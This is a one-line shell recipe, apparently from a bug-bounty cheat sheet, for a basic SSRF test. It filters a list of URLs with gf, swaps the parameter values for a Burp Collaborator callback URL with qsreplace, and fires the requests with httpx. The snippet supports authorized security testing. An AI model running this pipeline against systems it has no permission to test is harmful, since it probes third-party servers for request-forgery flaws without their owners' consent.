Basic SSRF test using burp collaborator

```plaintext
cat url.txt | gf ssrf | qsreplace '<burp_collab_url>' | httpx -silent

```
